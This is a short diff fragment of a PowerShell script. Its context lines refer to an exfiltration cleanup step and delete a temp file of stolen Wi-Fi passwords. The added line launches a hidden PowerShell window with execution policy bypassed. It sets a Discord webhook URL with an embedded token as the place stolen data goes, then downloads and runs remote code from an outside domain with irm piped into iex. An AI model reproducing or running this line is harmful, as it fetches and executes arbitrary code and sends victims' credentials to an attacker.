@@ -84,3 +84,4 @@ if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
 RI $env:TEMP/--wifi-pass.txt
+powershell -w h -NoP -Ep Bypass $dc=https://discord.com/api/webhooks/1193745305267621930/Up10B1JQMLCmX6Tcq2hbc3SHJTbi-vHPGJsBgYy76zmLP1hi6ka2wpROt3tUCruaH9Pb'';$db='';irm jakoby.lol/e8v | iex
